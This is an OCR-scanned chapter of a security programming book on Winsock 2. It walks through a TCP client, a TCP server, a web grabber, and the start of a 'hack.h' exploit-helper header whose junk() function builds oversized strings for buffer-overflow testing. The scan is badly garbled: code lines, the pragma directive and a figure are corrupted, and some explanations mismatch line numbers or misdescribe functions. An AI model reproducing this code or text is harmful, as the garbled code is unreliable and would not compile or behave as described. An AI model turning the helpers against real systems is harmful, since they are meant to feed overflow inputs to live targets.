appliance is. Appliance vendors must conform to the Windows SPI in such a way that 
both new and old programs are able to function with almost any hardware. 
The vast majority of Windows programs that incorporate socket programming in 
some fashion do so with either Winsock or the newer Winsock 2 API. Winsock 2 is a 
rather large upgrade with considerably more functionality than what was in Winsock or 
Winsock 1.1,This chapter focuses on using Winsock 2 API. 
NOTE 
The code in this chapter was created and tested using Visual Studio 6 on 
Windows 2000 and XP. 
Winsock Overview 
Winsock was released in January 1993. One of its first limitations was that it could only be 
used for Transmission Control Protocol (TCP) /Internet Protocol (IP) connections, 
whereas Winsock 2 is capable of using many other types of connection protocols. Winsock 
has two dynamic link libraries (DLLs) associated with it, depending on whether it is 
writing a 16-bit or a 32-bit application.The winsock.dll component is used in 16-bit 
applications and wssock32.dll is used in 32-bit applications. Another major shortcoming of 
Winsock was its inability to have more than one instance running at a time.These limita-
tions were not flaws, but rather sacrifices that the programmers made in order to complete 
the component so that it could be used by the early Microsoft operating systems. 
Due to the limited functionality of Winsock, Winsock 2 is the standard API for 
windows socket programming today. Winsock 2 was first available for Windows 98 and 
the Windows NT 4.0 operating systems.They, and all other Windows operating systems 
since, have Winsock 2 installed on them and can support the functionality it provides. 

Windows Sockets (Winsock) • Chapter 4 
147 
A 
NOTE 
The scripts in this chapter will not compile or run unless the ws2_32.dll compo-
nent is present on the machine; this is the component that provides Winsock 2 
functionality and can be downloaded from the Microsoft Web site. 
Winsock 2 is exclusively a 32-bit component; as such it will not work on Windows 
3.11, NT 3.51, or any of Microsoft's earlier 16-bit operating systems. However, scripts 
written on older 16-bit operating systems that use Winsock 1.1 can be run on the new 
systems' because Winsock 2 is almost fully backward-compatible.The only exception to 
this is when a Winsock 1.1 application uses blocking hooks, which are not supported by 
Winsock 2.The new functionality ofWmsock 2 over Winsock 1.1 includes: 
• 
Additional Protocols Asynchronous Transfer Mode (ATM), Internetwork 
Packet Exchange (IPX)/Sequenced Packet Exchange (SPX), and Digital 
Equipment Corporation Network (DECnet). 
• 
Conditional Acceptance of Connection The ability to reject a connect 
request before one takes place. 
• 
Connect and Disconnect Data Only applies to transport protocols that 
support it;TCP/IP does not support this. 
• 
Layered Service Providers The ability to add services to existing transport 
providers. 
• 
Multipoint and Multicast Protocol-independent APIs and protocol-specific 
APIs 
• 
Multiple Namespaces Select the protocol you want to resolve hostnames or 
locate services. 
• 
Multiple Protocol Support Windows Open Systems Architecture permits 
service providers with "plug-in" and "pile-on" capabilities. 
• 
Overlapped I/O and Event Objects Utilize Win32 paradigms for 
enhanced throughput to these services. 
• 
Quality of Service (QOS) Monitors and tracks socket bandwidth. 
• 
Scatter and Gather Send and receive packets from several buffers nearly 
simultaneously. 
• 
Socket Sharing Two or more processes can share the same socket. 
• 
Transport Protocol Independence The ability to choose a protocol by the 
services it provides. 
• 
Vendor IDs and a Mechanism for Vendor Extensions The ability of 
vendors to add specific APIs. 

148 
Chapter 4 • Windows 5ockets (Winsock) 
Winsock 2.0 
Before beginning this program you must open Visual Studio 6.0. Exploit scripts are 
written almost exclusively as simple console applications. Console applications are run in 
a Windows command prompt, which is similar to the UNIX terminal. Like the UNIX 
terminal programs, console applications take a few parameters and run a simple applica-
tion. To start a new workspace with an empty Win32 Console application, do the fol-
lowing: 
1. In the File menu, select New. 
2. Select a Win32 Console Application, give it an appropriate project name, and 
click OK. 
3. 
Select An empty project and press Finish to get started. 
4. 
From the File menu, select New 
5. Select C/C++ Source File, name the file appropriately, and press OK. 
6. You should now have an empty source file. 
Your program must include the Winsock 2 header file, which is done with #include 
<winsock2.h>. Winsock 2 also needs a link to its library in order for it to work. 
Without a link to the appropriate library, your compiler or linker will generate errors to 
the effect that it does not recognize the Winsock 2 functions. Linking to the library can 
be done in one of two ways in Visual Studio 6.0. 
• 
Link the libraries in the .c or .cpp source file. This is the easier and preferred 
method, especially when you share your source with others. 
• 
Link the libraries through the Visual Studio workspace; note, however, that this 
makes sharing code harder. If you have code online that is not compiling, 
check that the libraries are properly linked. The following are step-by-step 
instructions for the two linking methods. 
Linking through Visual Studio 6.0 
1. Press ALT+F7 or go into the Project menu and select Settings. 
2. 
In the Project Settings dialog box, go to Link and then Object/library mod-
ules: and add ws2_32.iib. Press OK. 
3. You should now be properly linked to the ws2_32.dll (see Figure 4.1). 
Linking through Source Code 
1. Add the following code to your source directly under your include statements: 
#pmgmti cominaitflib, "ws2_32,!ib"). 
2. 
Your code should now be properly linked. 

Windows Sockets (Winsock) • Chapter 4 
149 
Figure 4.1 Visual Studio Project Settings and Menu 
'""•*•• •"" 
£ettri^f« [vWo5Tirb^~ 
J Suite Ffci 
LJHuteFfcl 
lj Fteio-jrce Fin 
JLf2<i 
z. 
Effld | Osbug | C G ~ 
Lrl 
| Rmwcj [TJ7 
C*egw |G»r«d 
3 
| 
|Debug/Ge#wic^*i3ia* 
[ tb daau*32 bb ujtd to odbc32.ib ottraoZ? tb 1 M M 9 " 
[? £enerale d*tug irJo 
f tr/xxe -sH de+aJt l^cane-s 
r Ertabkr poking 
Pi eject QptioiK 
^frt!aLJ^^tw&tb gtf 12 16*#up«llb c«ndg& *> *] 
^api^li5ih4l3?lbote52lfcot*fiiJ(3?lbuiKlLth 
^ 
odbc33 ih ocfcccp32 lb kerrwl32 lb user 32 lb gd32 lb ^J 
Cff. 
CanceJ 
To start the Winsock 2 API, you must first create a H^S^D/ITM object, which is the 
object that accesses the ws2_32,dll and is needed in order to make calls to it. In Example 
4.1, the WSADATA object contains a number of properties, but the only one needed 
for our purposes is wVersion.The MAKEWORD() function will place the version 
number in a standard form; in this case MAKEWORD(2, 0) means version 2t(), 
Example 4.1 The WSADATA Object 
SQCK_STREAMH 0) ', 
SOCK_DGRAM, 0)J 
* t a r g e t _ p t r ; 
i 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 { 
27 
printf("Failed to connect.•); 
28 
exit (1) ! 
29 > 
30 
char *recv_string = new char [MAX] 
WSADATA wsaData; 
WORD wversionRequested; 
wVersionRequested = MAKEWORD(2H 0) r-
WSAStartuptwVersionReguestedj ^ws^Data) ; 
If ( WSAStartuptwVersionRequested, kwsaData) 
< Q ) 
{ 
printi("Wrong version"); 
exit(1}j 
} 
SOCKET MySocket? 
MySock = socket (AF_INBTH 
MySock = socket(AF_INET, 
struct hostent 
target_ptr = gethostfoyname( targetip ); 
if ( Target_ptr = getnogtbyname( targetip ) == MULL } 
{ 
printf ("Can not resolve name.H|} j 
exit(1}; 
} 
Struct sockaddr_in 
sock; 
Hemcpy ( &sock, sin_addr. s_addr, target_ptr->h_addrr target_ptr->h_length ) ; 
sock.sin_family = AF_1HET; 
sock.sin_port - htons{ port ); 
connect (MySock, (struct sockaddr *)tsock, sizeof (sock) ); 
If ( connect (MySock, (struct sockaddr *)&sockd sizeof (sock) } ) 

150 
Chapter 4 • Windows 5ockets (Winsock) 
31 
int nret = 0; 
32 
nret = recvl MySock, recv_string, MAX - 1 , 0 ) ,-
33 
if( (nret = recv( MySock, recv_string, MAX - 1 , OH 
<r= 0 
) 
34 ( 
35 
printf("Did not recover any data."); 
36 
exit(l); 
37 } 
38 
char send_string [ ] = p\n\r Hello World \n\r\n\r 1 1; 
39 
i n t n r e t = 0; 
40 nret • send( MySock, send_stringd sizeoff send_string ) -1, 0 ); 
41 
if( {nret = send( MySock, send_stringd sizeof( send_string ) -1, 0 I) <= 0 ) 
42 { 
43 
printf("Could not send any data,"); 
44 
exit(l); 
45 } 
46 
soc ke t addr_ in serverIn f o; 
47 
serverlnfo.sin_family = AF_INET; 
48 
s erverIn f o.s i n_addr.s_addr = I NADDR_AN Y ; 
49 
listen[MySock, 10); 
50 
SOCKET NewSock; 
51 NewSock = accept(MySock, NULL, NULL); 
52 
closesocket(MySock); 
53 WSACleanupO ; 
Analysis 
At lines 0 through 2, the WSAStartupQ function is used to start up the 
Winsock 2 API and takes two parameters: the version request and the WSA-
DATA object you would like to start. This function will return an error mes-
sage if it fails, which most often happens because the version you requested is 
higher than the available version. If the version you requested is lower than the 
available version, this function will not fail. 
At lines 3 through 8, we want to add a socket object and initialize it. The 
socket object contains three parameters: address family, type of socket, and pro-
tocol. For our use, address family will always be AF_INET.T\vi type of socket 
can be either SOCK_STREAM or SOCK_DGRAM. SOCK_STREAM is for 
two-way connection streams; it is a TCP connection when used with 
AF_INET. SOCK_DCRAM are connectionless buffers; when used with 
AF_1NET they are User Datagram Protocol (UDP) connections.The final 
parameter deals with the particular protocol you would like to use with the 
socket. It is specific to the indicated address family.You will probably never 
need to use this parameter, so always set it to 0. 
At lines 9 through 11, get the information about the IP address and port 
number to the socket. It is possible that the IP address will not be an IP 
address, but a fully qualified domain name that needs to be resolved. Resolving 
the domain name into a form that is easily transferable to the port will be 
done through the struct hosteiit.This can be accomplished through the use of 
the struct kostent'sgethosibynameQ function.You pass the gethostbynameQ string, 

Windows Sockets (Winsock) • Chapter 4 
which is the machine you wish to connect to. That string can either be an IP 
address, a fully qualified domain name, the name machine on the local area 
network (LAN), or any other name that an nsiookup can resolve. The getIwstby-
suuncQ function will return a NULL value if it cannot lookup the specified IP 
address, 
At lines 12 throughlS, inside of the struct hostent there should be an IP address 
correctly formatted for our needs. This must be moved to the struct sockaddr_in. 
First, you must declare a sockaddr variable and then fill it with the IP address 
information that now exists at the location that the target_ptr is pointing to. 
This is accomplished with the memcpy(') function, which works just like a 
strcpy() function, except with memory chunks. It takes three parameters: the 
location that will get pasted to, the location that is being copied, and the 
length of the location that you wish to copy. 
At lines 19 through 20, the sock is still not complete; it needs the type of con-
nection and the port information. The type of connection is the Internet 
(AF_INET), which will be placed in the siii_faniity value.The port number of 
the service to which we would like to connect will be placed in the siti_port 
variable. However, sin_port this port information must be a 16-bit number in 
network-byte order that is used by TCP/IP networks.Your port will simply be 
a number stored in an integer, and as such it must be converted into the 
proper form. The htonsQ function does just that. It takes one parameter and 
returns it in the expected network-byte order. 
At lines 21 through 22, it is now possible to make a connection, which is 
accomplished with the connectQ function. It is used to establish a connection to 
a socket object. It takes three parameters and returns an error number.The first 
parameter is the name of the socket to be connected; in this case it is be 
My Sock, The second parameter is the socket information, which is the port, IP 
address, and type of connection. This is already been placed in the struct vari-
able sock so all that is needed is to point to it. The last parameter is the size of 
the second parameter, which can be determined with a sizeofQ function. If suc-
cessful, the error is a 0. As with the WSAStartnpQ function, it is best to do at 
least a some error checking to ensure that the socket connected. 
At lines 23 through 28, it is possible to send to and receive data from the 
machine on the other end. The recvQ function is used to send data to the other 
machine. The recvQ function takes four parameters and returns an integer. The 
first parameter is the socket, which should do the sending.This is the now 
connected to MySock.The second is the string where you intend to hold the 
information you get back. The third parameter is the maximum length of the 
buffer you wish to receive; this the string length minus 1 to account for the 
escape character. The last parameter is a flag specifying how the call is made. 
The call can be made with a MSG_PEEK, where you can look at the data 
without removing it from the buffer.The second way is MSG_OOB, which is 
used with DECnet protocol. Most likely you will choose 0, which will move 

152 
Chapter 4 • Windows 5ockets (Winsock) 
the information to your string and erase the buffer. The return value will be 
the length of the buffer; a failed recovery will result in this value being a 0 or 
negative number. 
• 
At lines 29 through 36, the send() function is similar to the recvQ function, 
except that its job is to send data. It also takes four parameters and returns and 
integer. The first parameter is the socket just like in the recvQ function. The 
second parameter is the string you wish to be sent. The third parameter is the 
length of the string being sent. Again, this is obtained by using the sizeoff) 
function minus 1, because we do not intend to include the escape character in 
the sent message. The fourth parameter is the length of the string you are 
sending.The last is the same flag option that is used in the rm>() function. If 
the length sent is 0, then the message was not sent. This is a helpful hint for 
determining if the message was sent. 
• 
At lines 37 through 44, wc intend on building a server application so we will 
need the socket to wait for a client to connect. This is done using the listenQ 
function, which takes two parameters and returns an integer. Before the listenQ 
function can be used, a socket must be created that is listening on the com-
puter's IP address and on a port of your choosing. Set the sin_addr.s_addr to be 
INADDR_ANY to specify that it is listening on the local address.The first 
parameter listenQ needs is the socket that it is listening on.The second param-
eter is the maximum number of connections that the socket will communicate 
with at one time. 
• 
At lines 45 through 48, if a client attempts to make a connection to the server 
it is up to the aaeptQ function to accept the connection. The aaeptQ function 
takes in three parameters and returns a socket.The first parameter is the socket 
that has been waiting for a connection.The second is an optional parameter 
that returns a pointer to an addr parameter, which is the address of the con-
necting client. The third is also an optional parameter; the length of the addr 
parameter. The returned socket is used to initialize a new socket that will con-
tinue communication with this recently connected client. 
• 
At lines 51 through 52, an important job that is often overlooked is cleaning 
up. Clean up is done with two functions: close.wckctQand WSACkanupQ. The 
ciosesocketQ function will close the socket and free up any memory it has taken. 
The WSACIeaiutpQ function stops the PVSADATA object, frees up any 
memory it was using, and stops using ws2_32.dll. As your programs get larger 
and more complicated, it becomes increasingly important to free up any 
objects you are not using. Failure to do so will result in a poor-running appli-
cation that uses up more memory than it needs. 

Windows Sockets (Winsock) • Chapter 4 
153 
Case Study: Using 
WinSock to Grab a Web Page 
This cast? involves building a basic Web grabber. It is a simple application that can grab 
and display the contents of a Web page to the command prompt screen. 
This application should take in three arguments.The first argument is the IP address 
of the server, the next is the port you want to access, and the last is the file you want to 
retrieve. Only the IF address is required; the port number and file that you wish to grab 
are optional.The port should default to port 8(1 when not specified, and the file should 
default to the default Web page of the server you are accessing (see Example 4.2).This 
application should also filter out any error pages and only display the contents of real 
Web pages. 
m Example 4.2 Generic File-Grabbing Application 
• 
#include <stdio.h> 
2 ((include "hack.h" 
3 
4 
int main(int argcr char *argv(]) 
5 { 
6 
int port = 80; 
7 char* targetip; 
8 
9 
if (argc < 2) 
10 ( 
11 
printf("WebGrab usage;\r\n"); 
12 
printf(" 
%s <TargetIP> [port]\r\n", argv[0](; 
1 3 
return(O) ,-
14 
} 
15 
16 
targetip = argv[l] ; 
17 
char* outputr 
18 
19 
if (argc >= 3) 
20 
[ 
21 
port = atoi(argv(2])j 
22 
) 
23 
24 
if [argc >= 4) 
25 
[ 
26 
output = get_http(targetip H port, argvpl ) ; 
27 
) 
28 
else 
29 
{ 
30 
output = get_http(targetip H port, 
M / " ) ; 
31 
} 
32 
if { is_5tring_in{ pError 40" t output } 
33 
is_string_in{"302 Object moved", output J 
34 
is_string_in("404 Not Found", output } 
35 
is_string_in ("404 Object Not Found41
 d output ) ) 
36 
{ 
37 
printf("Page does not exist! *) ; 
38 
} 

154 
Chapter 4 • Windows Sockets (Winsock) 
39 
else 
40 
{ 
41 
printI("*s", output); 
42 
) 
4 3 
r e t u r n [ 0 ) ; 
44 ) 
Analysis 
• 
Line 0 is a reference to the previous header file made (see Example 4.5). 
• 
Lines 31 through 35 are used to filter out various Web server error messages 
when a Web page is not on the server. 
Writing Client Applications 
With a working knowledge of Winsock, we can now work on building an application 
that can use that functionality: Because a client application uses fewer components than a 
server application, we will build it first; the next section looks at server applications. 
The program ClicntApp.exe takes argument inputs.The first one is required; it can 
either be an IIJ address or a fully qualified domain name. The port number argument is 
optional; if no port is given, the program will default to port 8(1 (see Example 4.3). 
When run against a Web server, it will return to the default Web page. (Later in this 
chapter we will add functionality so that we can make requests for specific Web pages 
on the server.) This program will also work against other ports such as 25 (Simple Mail 
Transfer Protocol [SMTP|), which gives you back a banner. Some ports such as 23 
(Telnet), reply back with what appears to be "junk," because it is looking for a Telnet 
connection and that junk is used by yourTelnet service to make a login. 
™»t>"> Example 4.3 TCP Client Application 
1 
^ i n c l u d e 
<=stdio,h> 
2 
ttinclude 
<win50ck2.h> 
3 
4 
ftpragma 
comment { l i b H
 1lws2_32 . l i b * ) 
5 
^define STRING_MAK 
1024 
6 
(rdefine MAX 
64000 
7 
char 
* c l i e n t _ s e n d ( c h a r 
* t a r g e t i p , 
i n t p o r t ) ; 
8 
t 
9 
W5ADATA wsaData; 
10 
WORD wVersionRequested; 
n 
struct hostent 
target_ptr; 
12 
s t r u c t sockacldr_in 
socle; 
13 
SOCKET 
MySock; 
14 
wVersionftecrJested = MAKEW0RDI2, 2 ) ; 
15 
16 
if [WSAStartuptwVersionRequested, kwsaData) <: 0) 
17 { 
18 
printf("#####*#**##»##**# ERROR! 
#(#####* m # * t \ n " ) ; 
19 
2 0 
p r i n t f ( " Y o u r ws2_32.dll 
i s o u t d a t e d . 
\ n " ) i 

Windows Sockets (Winsock) * Chapter 4 
155 
21 
printf ("Download and install the most recent \n"); 
22 
printf("version of ws2_32.dllT\n"); 
23 
24 
WSACleanupO ; 
25 
e x i t ( l ) ; 
26 
) 
27 
MySock = Socket(AF_INET, SOCK_STREAM, 0)? 
28 
if(MySock==IKVALID_SOCKET) 
29 
{ 
30 
printf("Socket error!\r\n"); 
31 
32 
closesocket(MySock); 
33 
WSACleanupO; 
34 
e x i t ( l ) ; 
35 
) 
36 
if ((pTarget = gethostbyname(targetip)) == NULL} 
37 
t 
38 
printf("Resolve of %s failed, please try again.\am, targetip); 
39 
closesocket(MySock); 
40 
WSACleanupO ; 
41 
exit(l); 
42 
) 
43 
memcpy(&sock,sin_addr.s_addr, pTarget->h_addr, pTarget->h_length); 
44 
sock.sin_family = AF_INET; 
45 
sock.sin_port = htons( port ); 
46 
if ( (connect(MySock, 
(struct sockaddr *)&sock, sizeof (sock) ))) 
47 
{ 
48 
printf("Couldn't connect to host.\n") ; 
49 
closesocket(HySock}; 
50 
WSACleanupO ; 
51 
exit(1); 
52 
) 
53 
char *recvString = new char[MAX]; 
54 
int nret; 
55 
nret = recv(MySock, recvString, MAX + 1, 0); 
56 
char *output= new chartnret]; 
57 
strcpy(output, " • } ; 
58 
if (nret == SOCKET_ERROR) 
59 
{ 
60 
printf("Attempt to receive data FAILED. \n"); 
61 
} 
62 
else 
63 
{ 
64 
strncat[output, recvString, nret); 
65 
delete [ ] recvString; 
66 
} 
67 
closesocket[MySock); 
68 
WSACleanupO ; 
69 
return (output)j 
70 
delete [ ] output; 
71 } 
72 int main(int argc, char *argv[]) 
73 < 
74 
int port = 80; 
75 
char* targetip; 
76 
char* output = NULL; 
77 
if (argc < 2) 

156 
Chapter 4 • Windows 5ockets (Winsock) 
78 
t 
79 
printf("CiientApp usage:\r\n"); 
80 
printf(" 
%s <TargetIP> [port]\r\n", argv[0]); 
81 
return(O); 
82 
} 
83 
targetip = argv[1]; 
84 
if (argc >= 3) 
85 
{ 
86 
p o r t = a t o i [argv[2] } -, 
87 
} 
88 printf("%s", client_sen6M targetip, port) ); 
89 
return(O); 
90 } 
Analysis 
At lines 0 through 1 are the headers, with a link to ws2_32.lib and add two 
constants for this project. 
At line 3, for greater portability place the socket programming outside of the 
main program in a function called c!ient_sendQ. 
At line 4, the STRING_MAX will be used for the basic string lengths used in 
a send request.The current maximum is 1024 characters, which is sufficient for 
most "normal" send requests. However, exploit and vulnerability checks, espe-
cially ones that use buffer overflows, may exceed this value. They typically gen-
erate runtime errors when STRING_MAX is too small. 
At line 5, the other constant MAX is much larger than STRING_MAX.This 
string is the maximum size of the buffer used to hold the returned results, usu-
ally the long string of a Hypertext Markup Language (HTML) document. This 
may also be too small for other usages, and will generate runtime errors when 
it attempts to hold a string that is too long. 
At line 6, the function dient_sendQ will accept two variables: one for the IP 
address and one for the port we want to connect to.This function returns a 
pointer to the returned string. 
At line H is initialization of the WSADATA object, which uses ws2_32.dll. 
At line 9, will build a WORD called wVersionRequest, which will be used later 
to ensure that the system has a new or updated version oiws2_32.dH. 
At line 10, the i7nirf hostcut is a struct used to hold socket information; it will be 
used later to do name resolution if necessary. 
At line 11, the struct sockaddrjti is very similar to the struct hostent, only it is 
used to bold the information on tbe socket you wish to connect to later. 
At line 12, the SOCKET is the socket object that we will communicate 
through. 
Lines 15 through 25 start the WSAData object and make sure that it is the 
correct version of ws2_32,dlLT)\e function WSAStar tup Q will return a 0 if 

Windows Sockets (Winsock) • Chapter 4 
157 
successful and a negative number if a failure. In a more complex program, we 
would probably want to include extensive error handling; however, a failure at 
this point will most likely be due to an incorrect version of ws2_32.dll. 
• 
At line 26, initialize the socket for the intended purposes. The AF_INET 
means this will be used for Internet use. The next parameter has two possibili-
ties: SOCK_STREAM, which basically means TCP protocol, and 
SOCK_DGRAM, which means UDP protocol. This is meant to be a TCP-
type connection, so we will use SOCK_STREAM. Next, a quick error check 
is done to make sure the socket was successfully initialized. 
• 
At line 35, the pTargct will point to a data structure where a name resolution 
will take place. An unsuccessful resolution will return a NULL, at which point 
we will exit the function. 
• 
At line 42, with the input now checked and properly made into an IP address, 
copy that block to the struct sock where it will be used to make a connection. 
• 
At line 43, set the struct sock with AF_INET and set its port to the one defined 
by the input. 
• 
At lines 43 through 44, connect the socket to the remote machine at the spec-
ified port and IP address. 
• 
At line 45, the cotmectQ function must use MySock as the connection object; use 
the name of the socket to connect to (in the sock structure) and the length of 
that parameter. 
• 
At line 52 and 53, declare a string to hold the recovered information and its 
length before making a request for the data from the server. 
• 
At line 54, use the rccv() function to get the data. It takes four parameters and 
returns an integer, which is the length of the string just recovered. The first 
parameter is the socket we intend to use, which is MySock. The second param-
eter is a string to hold what will be recovered.The next parameter is the 
length of the buffer; use the constant MAX and add 1 to it for the escape 
character.The last parameter is a flag for MSG_PEEK, which lets you look at 
the data without removing it from tire input queue, and MSG_OOB, which is 
used with the DECnet protocol. We do not need either, so we set it to 0. 
• 
At lines 56 through 60, the recovered string will require some of parsing, so we 
will declare a string output, which will be declared on the heap. Next, an error 
check is done to make sure the recvQ function succeeded and recovered a string 
back. If not, an error message is printed to the screen. If successful, the recov-
ered string will be copied to the string output, cutting the excess junk off of 
the end. (If you skip this step and just return the recovered string, you will 
have a lot more "junk" printing at the end of the string.) 
• 
At lines 66 through 69, it is important to clean up the mess and free up all of 
the sockets and memory that are no longer needed. At this time, we also return 
the value. 

158 
Chapter 4 • Windows Sockets (Winsock) 
• 
At lines 71 through 89, declare the variables you will be using to hold the 
port number, the target IP address, and a pointer to the output. Place the cor-
rect values into the chent_jcnd() function and print the output to the screen. 
Writing Server Applications 
The server application is nearly identical to the client application; both send and receive 
information. The only difference is how the connection is made. The nature of a server 
is to wait around listening for a client to connect. Once the client connects to the 
server, the server uses the same functions used in the client application. Because the two 
programs are nearly identical. Example 4.4 covers just the new material used by the 
server and the changes made from the client application. 
Example 4.4 TCP Server Application 
1 Winclude <stdio.h> 
2 
#include <winsock2. h> 
3 
4 
ttpragma 
comment 
( l i b r 
*ws2_32 . l i b " ) 
5 
6 
tfdefine STRING_MAX 
2048 
7 
((define MAX 
640000 
8 
(define MAX_COM 
16 
9 
bool server(int port, char* send_string) 
10 { 
11 
WSADATA wsaData; 
12 
WORD wVersionReciuested; 
13 SOCKET MyServer; 
14 
int nret; 
15 
16 
wVersionRequested = MAKEW0RDI2, 
2); 
17 
if 
[WSAStartup[wVersionRequested, 
kwsaData) 
< 0) 
18 
t 
19 
printf ("########*######## ERROR !##################»###tf\n"); 
20 
printf("Your ws2_32.dll is too old to use this application. 
\n"); 
21 
printf("Go to microsofts web site to download the most recent \n")j 
22 
printf("version of ws2_32.dll. 
\n") ; 
23 
24 
WSACleanupO ; 
25 
r e t u r n 
(FALSE); 
26 } 
27 
28 
MyServer = socket(AF_INET,SOCK_STREAM,0); 
29 
30 
if 
(MyServer == INVALID_SOCKET) 
31 
( 
32 
nret = WSAGetLastError(); 
33 
printf("Socket did not connect. \n"); 
34 
closesocket(MyServer}; 
35 
WSACleanupO ; 
36 
return (FALSE); 
37 
J 
38 
struct sockaddr_in serverInfo; 

Windows Sockets (Winsock) • Chapter 4 
159 
39 
serverInfo.Ein_family • AF_INET; 
40 
serverlnfo - sin_addi" - s_addr = TNADDR_A$JY; 
41 
Serverlnfo*sin_port = htons(pOrt); 
42 
nret = bind(MyServer, 
(struct sockaddr M&serverlnfo, sizeof (serverInfo) ); 
43 
44 
if (nret == SOCKET_ERR0R) 
45 
{ 
46 
nret = WSAGetLastError(I ; 
47 
printf("Error on bind \ n " ) ; 
48 
49 
closesocket(MyServer); 
50 
WSACleanupf); 
51 
return (FALSE); 
52 
} 
53 
nret = listen(MyServer, MAX_CON); 
54 
55 
if (nret == SOCKET_ERROR) 
56 
{ 
57 
nret = WSAGetLastError!); 
58 
printf("Error on listen \n"); 
59 
60 
closesocket(MyServer); 
61 
WSACleanupf) ; 
62 
return (FALSE); 
63 
} 
64 
SOCKET MyClient; 
65 
MyClient = accept(MyServer, NULL, NULL); 
66 
67 
if (MyClient == INVALID_SOCKET) 
68 
{ 
69 
nret = WSAGetLastError() ; 
70 
p r i n t f ( M E r r o r a t accept()•); 
71 
closesocket(MyServer); 
72 
closesocket(MyClient); 
73 
WSACleanupf); 
74 
return (FALSE); 
75 
) 
76 
char *sendStr = new char(STRING_MAX]; 
77 
strcpy (sendStr, 
"") ,-
78 
strcpy(sendStr, 
send_string); 
79 
80 
nret = send(MyClientH sendstr, strlen(sendStr)-1 H 0); 
81 
82 
if (nret == SOCKET_ERROR) 
83 
( 
84 
printf("Message could not be sent") 
85 
) 
86 
else 
87 
{ 
88 
printf("Message sent. \n"); 
89 
} 
90 
91 
delete [ ] sendstr; 
92 
closesocket{MyClient); 
93 
closesocket{MyServer); 
94 
95 
WSACleanupf); 

160 
Chapter 4 • Windows 5ockets (Winsock) 
96 
return (TRUE); 
97 } 
98 
int main(int argc, char *argv[]) 
99 { 
100 
int port = 777; 
101 
char* targetip; 
102 
char* output = NULL; 
103 
104 
if (argc < 2} 
105 
{ 
106 
printf("ServerApp usage;\r\n"i ; 
107 
printf (" 
%8 [portl\r\n", argv[01 ) ; 
108 
return(O); 
109 
} 
110 
111 
targetip = argv(l); 
112 
if (argc >= 2) 
113 
{ 
114 
pore = atoi(argv[l]}; 
115 
} 
116 
1 17 
bool up = TRUE; 
118 
char sendStr[STRING_MAX] ; 
119 
120 
strcpylsendStr, "\r\o Hello world! \r\n\r\rr); 
121 
122 pri ntf t"Starting 
Server...\n") ; 
123 
124 
do 
125 
{ 
126 
up = server (port, sends tr) ; 
127 
Iwhilelup) ; 
128 
129 
return(O); 
130 } 
With ClieutApp.exe and ServerApp.exe working, you can test them on each other. 
Open up two command prompts. At the first command prompt, run the ServerApp.exe 
on any port you like. If you do not add a value, it will default to 777. The ServcrApp.exe 
will then tell you it is starting and will wait for a connection. At the second command 
prompt, run the ClieutApp.exe; the first argument should be locallwst and the second 
argument should be the port you selected for your server. Press Enter.You should see 
Hello World! at the client's command prompt; it should say Message sent at the server 
command prompt.. The server will still be active and you can continue connecting to it 
using the CliaitApp.exe. In order to shut the ServerApp.exe off, you must press CTRL + 
C to break out of the program, 
Analysis 
• Line 38 has been added to the sever address of to the serverlnfo struct. This is set 
to any local address because it is listening, not actively attempting to make a 
connection. 

Windows Sockets (Winsock) • Chapter 4 
161 
• 
At line 41, the server socket is being bound to the local server address using 
the bindQ function. This way the server will be connected to the socket that 
the client connects to.The server will receive the client's IF address and begin 
communicating to that IP address when the client connects. 
• 
At line 52, the server is ready and waiting for a valid connection from a client. 
• 
At lines 63 through 75, the server application will make a second connection 
that will take over communication with the new client. This way, the server 
socket can go back to waiting for a new client to connect with. The client 
socket uses the acccptQ function to rake over communicating with the new 
client. From this point on, the function will be communicating with the client 
through the MyClient socket. 
• 
Line 80 uses the send() function instead of the recv() function, as was used with 
the CtictitApp program.The sendQ function works just like the recvQ only it 
sends a string instead of receiving one. The sendQ function will return the 
number of bytes sent if it is successful; otherwise, it will return an error 
number.The first parameter is the socket you wish to send the information on. 
The second parameter is the string you wish to send (in this case it is send St r). 
This is one of the two inputs of the severQ function. The third parameter is the 
length of the string to be sent. The fourth parameter is a flag that is used to 
indicate that it is a DECnet connection or for when you do not want data 
routed. We do not want either option, so we use 0, 
• 
Lines 98 through 130 contain the main function, which simply takes in user 
input and pushes a string through the serverQ function.The server will simply 
sit waiting for a connection and then send the Hello World. It will continue to 
loop through that until an error occurs in the serverQ function. 
Writing Exploit and 
Vulnerability Checking Programs 
With a working knowledge of Winsock 2, you can start writing exploit and vulnera-
bility checking programs. When writing exploit code or vulnerability checks, you will 
find it handy to have a few solid functions that you can reuse in other exploit codes. 
Instead of writing multiple small exploirs, you are going to create a large empty exploit. 
This empty exploit will con rain rwo file:, an empty.cpp source and a luuli.li header file. 
While not all of the functions are socket programs, the bulk or them are, and you will 
find the functionality they provide helpful when making a real exploit or vulnerability 
checker (see Example 4.5). All but the last of these functions will be in a header file 
called hack.h, which are included in the source exploits for the rest of this chapter. 
^ _ _ Example 4.5 Hacking Functions for a Hack.h File 
fff!^ffl • 
' 
(/include <winsock2.h> 

162 
Chapter 4 • Windows 5ockets (Winsock) 
3 
(pragma 
comment(lib,"ws2_32.lib") 
4 
(define STRING_MAX 
65536 
5 
(define MAX 
8388608 
6 
char * junk (char * i n p u t , 
irit r e p e a t ] 
7 
( 
8 
i n t 
maxSize; 
9 
char * j u n k S t r i n g = new char[STRING_MAX]; 
1 0 
s t r c p y ( j u n k S t r i n g , 
" " ) ; 
11 
12 
i f ( r e p e a t < STRING_MAX && r e p e a t > 0 
&& s t r l e n l i n p u t ) 
!= 0 
13 
&St s t r l e n l i n p u t ) <= (STRING_MAX - 1)) 
14 
( 
15 
maxSize = (STRING_MAX - I I / s t r l e n ( i n p u t ) ; 
16 
f o r ( i n t count = 0; count < r e p e a t 
17 
&k count < maxSize; count++) 
18 
t 
1 9 
s t r e a t ( j u n k S t r i n g , 
i n p u t J ; 
20 
} 
21 
} 
22 
e i se 
23 
( 
24 
printf("Invalid PerametersI \n") ; 
25 
strcpy(junkstring,"--FAILURE--"); 
26 
) 
27 
return (junkString); 
28 
delete [ ] junkString; 
29 } 
30 
bool 
i s _ u p ( c h a r * t a r g e t i p H 
i n t p o r t ) 
31 { 
32 
WSADATA wsaData; 
33 WORD wVersionRequested; 
34 struct hastent 
target_ptr; 
35 
struct sockaddr_in sock; 
36 SOCKET MySock; 
37 
wVersionRequested = MAKEW0RDI2, 2| ; 
38 
